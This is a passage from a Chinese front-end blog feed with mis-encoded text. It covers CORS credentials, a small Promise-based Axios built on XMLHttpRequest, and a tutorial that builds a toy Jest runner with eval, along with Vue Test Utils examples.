withCredentials</h5><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œè·¨æºèµ„æºä¸æä¾›å‡­æ®(cookie, HTTPè®¤è¯ï¼ŒSSLè¯æ˜)ã€‚é€šè¿‡å°†<em><code>withCredential</code></em>å±æ€§è®¾ä¸ºtrue, å¯ä»¥æŒ‡å®šæŸä¸ªè¯·æ±‚åº”è¯¥å‘é€å‡­è¯ã€‚å¦‚æœæœåŠ¡ç«¯æ¥å—å‡­æ®çš„è¯·æ±‚ï¼Œä¼šç”¨ä¸‹é¢çš„HTTPå¤´éƒ¨æ¥å“åº”ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure></p><p>å¦‚æœæœåŠ¡å™¨çš„å“åº”ä¸­æ²¡æœ‰åŒ…å«è¿™ä¸ªå¤´éƒ¨ï¼Œé‚£ä¹ˆæµè§ˆå™¨å°±ä¸ä¼šæŠŠå“åº”äº¤ç»™ JavaScript(äºæ˜¯ï¼ŒresponseText ä¸­å°†æ˜¯ç©ºå­—ç¬¦ä¸²ï¼Œstatus çš„å€¼ä¸º 0ï¼Œè€Œä¸”ä¼šè°ƒç”¨ onerror()äº‹ä»¶å¤„ ç†ç¨‹åº)ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createCORSRequest</span>(<span class="params">method, url</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">  <span class="keyword">if</span> (<span class="string">"withCredentials"</span> <span class="keyword">in</span> xhr)&#123;</span><br><span class="line">    xhr.open(method, url, <span class="literal">true</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> XDomainRequest != <span class="string">"undefined"</span>)&#123;</span><br><span class="line">    xhr = <span class="keyword">new</span> XDomainRequest();</span><br><span class="line">    xhr.open(method, url); </span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    xhr = <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> xhr; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> request = createCORSRequest(<span class="string">"get"</span>,<span class="string">"http://www.somewhere-else.com/page/"</span>); </span><br><span class="line">request.send();</span><br></pre></td></tr></table></figure></p><p><br></p><h5 id="1-7-4-å…¶ä»–è·¨åŸŸæŠ€æœ¯"><a href="#1-7-4-å…¶ä»–è·¨åŸŸæŠ€æœ¯" class="headerlink" title="1.7.4 å…¶ä»–è·¨åŸŸæŠ€æœ¯"></a>1.7.4 å…¶ä»–è·¨åŸŸæŠ€æœ¯</h5><p><br></p><h3 id="2-å®ç°Axios"><a href="#2-å®ç°Axios" class="headerlink" title="2. å®ç°Axios"></a>2. å®ç°Axios</h3><p>ç”¨Promiseå®ç°ä¸€ä¸ªç®€å•çš„axios<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Axios</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; url, method, data &#125; = obj;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    xhr.open(method, url);</span><br><span class="line">    xhr.onreadystatechange = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (xhr.readyState !== <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (xhr.status === <span class="number">200</span>) &#123;</span><br><span class="line">        resolve(xhr.response)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        reject(xhr.statuText)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xhr.send(data);</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ä½¿ç”¨çš„æ—¶å€™å°±å¯ä»¥ç”¨<code>.then()</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  url: <span class="string">'https://cnodejs.org/api/v1/topics'</span>,</span><br><span class="line">  method: <span class="string">'GET'</span>,</span><br><span class="line">  data: <span class="string">''</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">axios(obj)</span><br><span class="line">  .then(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(response)</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(error)</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://www.jianshu.com/p/874350b5aee7" target="_blank" rel="noopener">JS: ç”¨ Promise å†™ä¸€ä¸ª axios</a></li><li>ã€ŠJavascripté«˜çº§ç¨‹åºè®¾è®¡ã€‹XMLHttpRequest</li><li><a href="https://juejin.im/post/5aedd4a2f265da0b9d781b85" target="_blank" rel="noopener">å¦‚ä½•å®ç°ä¸€ä¸ªHTTPè¯·æ±‚åº“â€”â€”axiosæºç é˜…è¯»ä¸åˆ†æ</a></li><li><a href="https://juejin.im/post/5d5ccdd75188255625591357" target="_blank" rel="noopener">axioså¦‚ä½•åˆ©ç”¨promiseæ— ç—›åˆ·æ–°token</a></li></ul>]]></content>
      
      <categories>
          
          <category> HTTP </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ğŸ¤” Jestè¿è¡Œå‰ç«¯å•å…ƒæµ‹è¯•</title>
      <link href="/2022/04/24/jest/"/>
      <url>/2022/04/24/jest/</url>
      <content type="html"><![CDATA[<p>å•å…ƒæµ‹è¯•æ˜¯å¯¹è½¯ä»¶ä¸­çš„æœ€å°å¯æµ‹è¯•å•å…ƒåœ¨ä¸è½¯ä»¶å…¶ä»–éƒ¨åˆ†ç›¸éš”ç¦»çš„æƒ…å†µä¸‹è¿›è¡Œçš„ä»£ç çº§æµ‹è¯•ã€‚è¿™é‡Œçš„æœ€å°å¯æµ‹è¯•å•å…ƒï¼Œé€šå¸¸æŒ‡å‡½æ•°ã€æ¥å£ã€‚å®ƒä»¬æœ‰æ˜ç¡®çš„è¾“å…¥å’Œè¾“å‡ºï¼Œä¸ºäº†ä¿è¯ä»£ç é€»è¾‘æ­£ç¡®ï¼Œæˆ‘ä»¬éœ€è¦åˆ—ä¸¾æ‰€æœ‰è¾“å…¥ï¼Œå¹¶æ£€æŸ¥å®ƒä»¬çš„è¾“å‡ºæ˜¯å¦ç¬¦åˆé¢„æœŸï¼Œæ¥å®Œæˆå•æµ‹ã€‚</p><p>é—®é¢˜æ¥äº†ï¼Œå‰ç«¯éƒ½æ˜¯UIç»„ä»¶ï¼Œå¯ä»¥åšå•æµ‹å—ï¼Ÿæ€ä¹ˆæµ‹ï¼Ÿè¦æµ‹ä»€ä¹ˆï¼Ÿ</p><p>å…¶å®ä¸ºä¸€ä¸ªå‰ç«¯åº”ç”¨åšå•å…ƒæµ‹è¯•å’Œä¸ºå‡½æ•°ã€æ¥å£åšæµ‹è¯•ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆæ˜æ˜¾çš„åŒºåˆ«ã€‚æƒ³è±¡ä¸€ä¸‹ï¼ŒæŠŠç”¨æˆ·çš„ç‚¹å‡»è¡Œä¸ºä½œä¸ºè¾“å…¥ï¼ŒæŠŠç»„ä»¶æ¸²æŸ“å‡ºæ¥çš„HTMLä½œä¸ºè¾“å‡ºï¼Œä¸å°±å¯ä»¥éªŒè¯ä»£ç çš„æ­£ç¡®æ€§äº†å—ï¼</p><p>æ‰€ä»¥ï¼Œå‰ç«¯çš„å•æµ‹ç”¨ä¾‹ï¼Œå¤§æ¦‚æ˜¯è¿™æ ·çš„ï¼š</p><ul><li>åŠ è½½ä¸€ä¸ªUIç»„ä»¶</li><li>æ£€æŸ¥ç»„ä»¶æ¸²æŸ“å‡ºæ¥çš„HTML æ˜¯å¦ç¬¦åˆé¢„æœŸ</li><li>è§¦å‘ç‚¹å‡»äº‹ä»¶</li><li>æ£€æŸ¥æ˜¯å¦è°ƒç”¨äº†æ¥å£ï¼Œè°ƒç”¨å‚æ•°æ˜¯å¦æ­£ç¡®</li><li>è®¾å®šæ¥å£è¿”å›çš„æ•°æ®</li><li>æ¥å£æ•°æ®è¿”å›åï¼Œæ£€æŸ¥ç»„ä»¶æ¸²æŸ“å‡ºæ¥çš„ HTML æ˜¯å¦ç¬¦åˆé¢„æœŸ<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; mount &#125; <span class="keyword">from</span> <span class="string">'@vue/test-utils'</span></span><br><span class="line"><span class="keyword">import</span> api <span class="keyword">from</span> <span class="string">'@src/api.js'</span></span><br><span class="line"><span class="keyword">import</span> Login <span class="keyword">from</span> <span class="string">'../src/Login.vue'</span></span><br><span class="line"></span><br><span class="line">describe(<span class="string">'ç™»å½•ç»„ä»¶'</span>, () =&gt;&#123;</span><br><span class="line">  <span class="keyword">const</span> wrapper = mount(Login)</span><br><span class="line"></span><br><span class="line">  it(<span class="string">'ç‚¹å‡»ç™»é™†æŒ‰é’®'</span>, <span class="keyword">async</span>() =&gt; &#123;</span><br><span class="line">    <span class="comment">// æå‰å®šä¹‰æœåŠ¡ç«¯è¿”å›å†…å®¹</span></span><br><span class="line">    jest</span><br><span class="line">      .spyOn(api, <span class="string">'login'</span>)</span><br><span class="line">      .mockImplementation(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve(&#123; <span class="attr">status</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">      &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¨¡æ‹Ÿç”¨æˆ·æ“ä½œ</span></span><br><span class="line">    <span class="keyword">await</span> wrapper.find(<span class="string">'.button'</span>).trigger(<span class="string">'click'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ£€æŸ¥è°ƒç”¨API,è°ƒç”¨å‚æ•°æ˜¯å¦æ­£ç¡®</span></span><br><span class="line">    expect(api.login.mock.calls[<span class="number">0</span>][<span class="number">0</span>]).toEqual(&#123;</span><br><span class="line">      userName: <span class="string">'Mike'</span>,</span><br><span class="line">      passwork: <span class="string">'123456'</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ£€æŸ¥é¡µé¢æ˜¯å¦æ­£å¸¸æ˜¾ç¤º</span></span><br><span class="line">    expect(wrapper.text()).toBe(<span class="string">'ç™»å½•æˆåŠŸ'</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul><p>æœ‰éå¸¸å¤šçš„å·¥å…·å’Œæ¡†æ¶ï¼Œå¯ä»¥è¾…åŠ©æˆ‘ä»¬å®Œæˆä¸Šè¿°çš„å•å…ƒæµ‹è¯•ï¼Œæœ¬æ–‡ä»¥ Jest ä¸ºä¾‹ï¼Œè®²ä¸€ä¸‹å‰ç«¯å•å…ƒæµ‹è¯•å¦‚ä½•ç¼–å†™å’Œæ‰§è¡Œã€‚</p><p><br></p><h3 id="1-Jestç®€ä»‹"><a href="#1-Jestç®€ä»‹" class="headerlink" title="1. Jestç®€ä»‹"></a>1. Jestç®€ä»‹</h3><p>Jest æ˜¯ Facebook å¼€æºçš„ä¸€å¥—ç”¨æ¥åˆ›å»ºã€æ‰§è¡Œæµ‹è¯•ç”¨ä¾‹çš„ JavaScript æµ‹è¯•åº“ã€‚å®ƒæä¾›ä¸€ä¸ªç‹¬ç«‹çš„ã€å…·æœ‰æµè§ˆå™¨ä¸Šä¸‹æ–‡çš„Nodeè¿›ç¨‹æ¥æ‰§è¡Œå•å…ƒæµ‹è¯•ï¼ŒåŒæ—¶é›†æˆäº†æ–­è¨€ã€Mockã€Stubç­‰ API ç”¨äºç¼–å†™æµ‹è¯•ç”¨ä¾‹ã€‚ä¸ºäº†è¯´æ˜ç™½ Jest æ˜¯ï¼š</p><ul><li>å¦‚ä½•åŠ è½½UIç»„ä»¶ï¼ˆé¡¹ç›®ä»£ç ï¼‰ï¼Ÿ</li><li>å¦‚ä½•è§¦å‘ç”¨æˆ·ç‚¹å‡»è¡Œä¸ºï¼Ÿ</li><li>å¦‚ä½•è·å–é¡µé¢HTMLï¼Ÿ</li><li>å¦‚ä½•æ£€æŸ¥ä¸€ä¸ªå‡½æ•°æœ‰æ²¡æœ‰è¢«è°ƒç”¨ï¼Œä»¥ä»€ä¹ˆæ ·çš„å‚æ•°è¢«è°ƒç”¨ï¼Ÿ</li></ul><p>ä¸‹é¢ï¼Œæˆ‘ä»¬å®ç°ä¸€ä¸ªç®€æ˜“ç‰ˆçš„ Jest !</p><p><br></p><h3 id="2-å®ç°Jest"><a href="#2-å®ç°Jest" class="headerlink" title="2.å®ç°Jest"></a>2.å®ç°Jest</h3><p>å‡è®¾æˆ‘ä»¬è¦è·‘ä¸€æ¡å•æµ‹ç”¨ä¾‹ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ–­è¨€è¯­å¥<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.spec.jsexpect(<span class="number">2</span>Â +Â <span class="number">2</span>).toBe(<span class="number">4</span>)</span><br></pre></td></tr></table></figure></p><p>ä¸ºäº†åˆ¤æ–­è¿™æ¡å•æµ‹èƒ½å¦é€šè¿‡ï¼Œæˆ‘ä»¬éœ€è¦</p><ul><li>é€šè¿‡ <code>fs.readFile</code> æ‹¿åˆ° <code>test.spec.js</code> é‡Œçš„ä»£ç ç‰‡æ®µ <code>code</code></li><li>æ‰§è¡Œ <code>eval(code)</code>ï¼Œä»£ç ç‰‡æ®µ <code>code</code> è¢«æ‰§è¡Œ</li><li><code>try catch</code> ä¸€ä¸‹ <code>eval(code)</code>ï¼Œæ²¡æœ‰æŠ¥é”™åˆ™è¡¨ç¤ºå•æµ‹é€šè¿‡ï¼Œcatch åˆ° error åˆ™è¡¨ç¤ºå•æµ‹ä¸é€šè¿‡</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.js</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">runTest</span> (<span class="params">testFile</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> code = <span class="keyword">await</span> fs.promises.readFile(testFile, <span class="string">'utf8'</span>);</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="built_in">eval</span>(code);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Test Success'</span>)</span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Test Fail: <span class="subst">$&#123;error.message&#125;</span>`</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">runTest(<span class="string">'./test.spec.js'</span>)</span><br></pre></td></tr></table></figure><p><br></p><h3 id="3-å®ç°Expect"><a href="#3-å®ç°Expect" class="headerlink" title="3.å®ç°Expect"></a>3.å®ç°Expect</h3><p>ç°åœ¨ï¼Œæˆ‘ä»¬åœ¨å‘½ä»¤è¡Œé‡Œè·‘ä¸€ä¸‹ <code>node index.js</code> , ä¼šæç¤º <code>Test Fail: expect is not defined</code>ã€‚ ä»£ç ç‰‡æ®µè¢«æ‰§è¡Œäº†ï¼Œä½†æ˜¯æ­¤æ—¶ node ç¯å¢ƒé‡Œè¿˜æ²¡æœ‰ <code>expect</code> æ–¹æ³•ï¼Œæˆ‘ä»¬å®šä¹‰ä¸€ä¸ª <code>expect</code> æ–¹æ³•ç”¨äºæ–­è¨€ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.js</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> expect = <span class="function">(<span class="params">received</span>) =&gt;</span> (&#123;</span><br><span class="line">  toBe: <span class="function">(<span class="params">expected</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (received !== expected) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">`Expected <span class="subst">$&#123;expected&#125;</span> but received <span class="subst">$&#123;received&#125;</span>.`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">runTest</span> (<span class="params">testFile</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> code = <span class="keyword">await</span> fs.promises.readFile(testFile, <span class="string">'utf8'</span>);</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="built_in">eval</span>(code);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Test Success'</span>)</span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Test Fail: <span class="subst">$&#123;error.message&#125;</span>`</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">runTest(<span class="string">'./test.spec.js'</span>)</span><br></pre></td></tr></table></figure></p><p>å½“æµ‹è¯•ç”¨ä¾‹ä¸º<code>expect(2 + 2).toBe(4)</code>ï¼Œæ‰§è¡Œ <code>node index.js</code>ï¼Œå¯ä»¥çœ‹åˆ°æ‰“å°å‡ºæ¥çš„æ˜¯ <code>Test Success</code></p><p>æˆ‘ä»¬æŠŠæµ‹è¯•ç”¨ä¾‹æ”¹æˆ<code>expect(2 + 2).toBe(3)</code>ï¼Œæ‰§è¡Œ <code>node index.js</code>ï¼Œå¯ä»¥çœ‹åˆ°æ‰“å°å‡ºæ¥çš„æ˜¯ <code>Test Fail : Expected 3 but received 4</code></p><p>çœ‹ï¼Œä¸€ä¸ªç®€æ˜“ç‰ˆ Jest å°±è·‘èµ·æ¥äº†ï¼!</p><p>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨ Node ç¯å¢ƒé‡Œæ‰§è¡Œ <code>eval(code)</code>ï¼Œå½“ <code>code</code> æ˜¯åŸç”Ÿ JS ä»£ç æ—¶ï¼Œéå¸¸é¡ºç•…æ²¡æœ‰é—®é¢˜ã€‚ä½†è¦çŸ¥é“ï¼Œæˆ‘ä»¬è¦è·‘çš„ <code>code</code> æ˜¯é¡¹ç›®ä»£ç æ–‡ä»¶ï¼Œé‚£éƒ½æ˜¯ä¸€å †æ˜¯ <code>.vue</code> æ–‡ä»¶, <code>.ts</code> æ–‡ä»¶ï¼Œé‡Œé¢æœ‰å¾ˆå¤š Node ä¸æ”¯æŒçš„è¯­æ³•ï¼Œå¦‚ <code>JSX, TypeScript,  Vue æ¨¡æ¿</code>ã€‚</p><p>ä¸ºäº†ä½¿ <code>eval(code)</code> é¡ºåˆ©æ‰§è¡Œï¼Œæˆ‘ä»¬éœ€è¦å°†é¡¹ç›®ä»£ç è½¬åŒ–æˆåŸç”ŸJSã€‚è‡³äºæ€ä¹ˆè½¬åŒ–ï¼Œè¿™é‡Œå°±ä¸è¯¦ç»†è§£é‡Šã€‚å®é™…é¡¹ç›®ä¸­ï¼Œé€šè¿‡é…ç½® <code>jest.config.js</code> çš„ <code>tranform</code> å±æ€§ï¼ŒJestä¼šå¸®æˆ‘ä»¬å®Œæˆè½¬åŒ–ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// jest.config.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    transform: &#123;</span><br><span class="line">        <span class="string">'.*\\.(vue)$'</span>: <span class="string">'@vue/vue3-jest'</span>, <span class="comment">// ç”¨@vue/vue3-jestå°†.vueæ–‡ä»¶é‡Œçš„ä»£ç ç¼–è¯‘æˆåŸç”ŸJS</span></span><br><span class="line">        <span class="string">'^.+\\.js$'</span>: <span class="string">'babel-jest'</span>, <span class="comment">// ç”¨babel-jestå°†.jsæ–‡ä»¶é‡Œçš„ä»£ç ç¼–è¯‘æˆåŸç”ŸJS</span></span><br><span class="line">        <span class="string">'^.+\\.ts$'</span>: <span class="string">'ts-jest'</span>, <span class="comment">// ç”¨ts-jestå°†.tsæ–‡ä»¶é‡Œçš„ä»£ç ç¼–è¯‘æˆåŸç”ŸJS</span></span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°äº†åŸç”Ÿ JS ä»£ç ï¼Œä¹Ÿä¸ä»£è¡¨ <code>eval(code)</code>å¯ä»¥é¡ºåˆ©æ‰§è¡Œã€‚å‰ç«¯ä»£ç ä¸­å¾€å¾€åŒ…å«äº†å¤§é‡çš„ <code>DOM</code> æ“ä½œã€‚è¿™äº›æµè§ˆå™¨æä¾›çš„ API éœ€è¦åœ¨ node ç¯å¢ƒå†…æå‰å®šä¹‰å¥½ï¼Œæ‰èƒ½ä¿è¯ <code>eval(code)</code>é¡ºåˆ©æ‰§è¡Œã€‚</p><p>Jest ä¹Ÿåœ¨ Node è¿›ç¨‹é‡Œå†…ç½®äº† <code>JSDom</code>ï¼Œå®ƒä¼šå°†<code>document</code> å¯¹è±¡ã€ <code>window</code> å¯¹è±¡ã€ å…¶ä»– <code>DOM API</code>æ³¨å…¥ <code>Node.js</code> ç¯å¢ƒé‡Œï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åœ¨ V8 çš„ä¸Šä¸‹æ–‡ä¸­ç¼–è¯‘å’Œæ‰§è¡Œ js ä»£ç ã€‚</p><p>æœ‰äº†ä¸Šé¢çš„åŸºç¡€åï¼Œæˆ‘ä»¬å¯ä»¥å¼€å§‹æµ‹è¯• UI ç»„ä»¶äº†!</p><p><br></p><h3 id="4-ç»„ä»¶æµ‹è¯•-Vue-Util-Test"><a href="#4-ç»„ä»¶æµ‹è¯•-Vue-Util-Test" class="headerlink" title="4.ç»„ä»¶æµ‹è¯•: Vue Util Test"></a>4.ç»„ä»¶æµ‹è¯•: Vue Util Test</h3><p>æ–‡ç« å¼€å¤´è¯´åˆ°ï¼šâ€œæŠŠç”¨æˆ·çš„ç‚¹å‡»è¡Œä¸ºä½œä¸ºè¾“å…¥ï¼ŒæŠŠç»„ä»¶æ¸²æŸ“å‡ºæ¥çš„HTMLä½œä¸ºè¾“å‡ºï¼Œæ˜¯å¯ä»¥éªŒè¯å‰ç«¯ä»£ç çš„æ­£ç¡®æ€§çš„ã€‚â€</p><p>å¦‚ä½•æ¨¡æ‹Ÿè¾“å…¥ï¼Ÿå¦‚ä½•è·å–è¾“å‡ºï¼Ÿ</p><p>æµ‹è¯• UI ç»„ä»¶å¤§å¤šéœ€è¦å°†å®ƒä»¬æŒ‚è½½åˆ° <code>DOM</code> (è™šæ‹Ÿæˆ–çœŸå®) ä¸Šï¼Œæ‰èƒ½å®Œå…¨æ–­è¨€å®ƒä»¬æ˜¯å¦æ­£å¸¸å·¥ä½œã€‚è¿™é‡Œæˆ‘ä»¬è¦ç”¨åˆ° <code>Vue Test Utils</code>ã€‚å®ƒæ˜¯ Vue å®˜æ–¹çš„ååº•å±‚çš„ç»„ä»¶æµ‹è¯•åº“ï¼Œå®ƒå…è®¸åœ¨nodeè¿›ç¨‹é‡ŒæŒ‚è½½ Vue ç»„ä»¶ï¼Œæ¨¡æ‹Ÿè¾“å…¥ï¼ˆç”¨æˆ·ç‚¹å‡»ï¼Œ <code>prop</code>å’Œæ³¨å…¥ï¼‰ï¼Œè·å–è¾“å‡ºï¼ˆå½“å‰ç»„ä»¶æ¸²æŸ“å‡ºæ¥çš„HTMLï¼‰ã€‚</p><p>ä½ å¯ä»¥é€šè¿‡ <code>mount</code> æ–¹æ³•æŒ‚è½½ç»„ä»¶ï¼Œè¢«æŒ‚è½½çš„ç»„ä»¶ä¼šè¿”å›ä¸€ä¸ªåŒ…è£¹å™¨ <code>wrapper</code>ã€‚<code>wrapper</code>ä¼šæš´éœ²ä¸€ç³»åˆ— APIï¼Œç”¨äºæ¨¡æ‹Ÿç”¨æˆ·ç‚¹å‡»è¡Œä¸ºï¼Œè·å–ç»„ä»¶æ¸²æŸ“å‡ºæ¥çš„HTMLã€‚</p><p><code>Vue Utils Test</code>æä¾›çš„APIç¤ºä¾‹å¦‚ä¸‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import &#123; mount &#125; from &apos;@vue/test-utils&apos;</span><br><span class="line">import Login from &apos;./Login.vue&apos;</span><br><span class="line"></span><br><span class="line">// æŒ‚è½½ç»„ä»¶ï¼Œå¾—åˆ°Loginç»„ä»¶çš„åŒ…è£¹å™¨ wrapper</span><br><span class="line">const wrapper = mount(Login)</span><br><span class="line"></span><br><span class="line">// æ¨¡æ‹Ÿç”¨æˆ·äº¤äº’</span><br><span class="line">wrapper.find(&apos;.button&apos;).trigger(&apos;click&apos;)</span><br><span class="line"></span><br><span class="line">// è·å–ç»„ä»¶æ¸²æŸ“å‡ºæ¥çš„HTML</span><br><span class="line">wrapper.html()</span><br><span class="line">wrapper.text()</span><br><span class="line"></span><br><span class="line">// nextTick</span><br><span class="line">await 